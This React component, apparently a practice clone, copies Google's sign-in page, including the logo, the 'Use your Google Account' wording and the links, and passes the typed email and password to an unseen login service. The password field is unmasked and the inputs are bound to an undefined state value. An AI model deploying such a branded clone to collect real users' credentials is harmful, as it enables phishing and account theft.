import React, { Component } from 'react'
import { login } from '../../services/service'
import './Login.css'

import { Button, TextField } from '@material-ui/core';
// import { TextField } from '@material-ui/core';

class Login extends Component {
  constructor(props) {
    super(props)

    this.state = {
      email: "",
      password: ""
    }
  }

  saveEmail = (element) => {

    this.setState(
      {
        email: element.target.value
      }
    )
  }

  savePassword = (element) => {
    this.setState(
      {
        password: element.target.value
      }
    )
  }

  loginSubmit = () => {
    let obj = {
      "email": this.state.email,
      "password": this.state.password
    }
    login(obj);
  }

  render() {
    return (

      <div id="main" className="mainDiv">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="google.img" />
        <h1>Sign in</h1>
        <h3>Use your Google Account</h3>
        <form>
          <div className="Fields">
            <div className="input-Fs">
              <TextField id="outlined-basic" label="Email or phone" variant="outlined" value={this.state.value} onChange={this.saveEmail} />
            </div>
            <div className="input-Fs">
              <TextField id="outlined-basic" label="Password" variant="outlined" value={this.state.value} onChange={this.savePassword} />
            </div>
          </div>
          <div className="forget">
            <div className="forgot-email"><a href="_blank" className="Fg-email">Forgot email?</a></div>
            <div className="forgot-pass"><a href="_blank" className="Fg-email">Forgot password</a></div>
          </div>
          <div className="text">
            <p>
              Not your computer? Use Guest mode to sign in privately.
            </p>
            <a href="_blank" className="Fg-email">Learn more</a>

          </div>
          <div className="signup">
            <a href="_blank" className="Fg-email">Create an account</a>
            <Button variant="contained" onClick={this.loginSubmit}>Login</Button> 
          </div>
        </form>
      </div >
    )
  }
}

export default Login
